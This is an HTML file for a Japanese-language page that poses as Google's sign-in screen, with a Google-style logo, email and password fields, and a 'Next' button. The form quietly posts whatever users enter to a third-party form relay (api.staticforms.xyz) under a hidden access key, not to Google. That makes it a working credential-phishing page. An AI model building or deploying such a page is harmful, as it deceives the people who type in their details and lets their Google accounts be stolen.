<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Googleログイン</title>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
<div class="contact-form">
  <div class="google">
    <img src="https://iconlab.kentakomiya.com/wp/wp-content/uploads/2019/09/icon0154.png" width="120" height="40">
  </div>
  <div class="login">
    <font size="7"><br>ログイン</font>
  </div>

    <form action="https://api.staticforms.xyz/submit" method="post">
    <div class="account">
      <font size="5">お客様のGoogleアカウントを使用<br></font>
    </div>
      <input type="hidden" name="accessKey" value="1a18ab3d-41fd-4f0d-a529-d6c6bc1a63ed">
      <input type="hidden" name="subject" value="Test">
      <div class="item">      
        <font size="3" class="forget">メールアドレスまたは電話番号</font>
        <input type="email" class="inputs" name="email"/>
      </div>
	<font size="3" class="forget">パスワード</font>
    <div class="item2">
      <input type="password" class="inputs" name="name" required/>
    </div>

    <div class="gest">
    <font size="3">ご自身のパソコンではない場合は、ゲストモードを使用<br>して非公開でログインしてください。</font>
    <font size="3" class="syousai">詳細</font>
    </div>

        <div class="button-area">
          <input type="submit" value="次へ" />
        </div>

        <div class="create">
          <font size="4">アカウント作成<br></font>
        </div>

      </div>
    </form>
</div>
  </body>
</html>
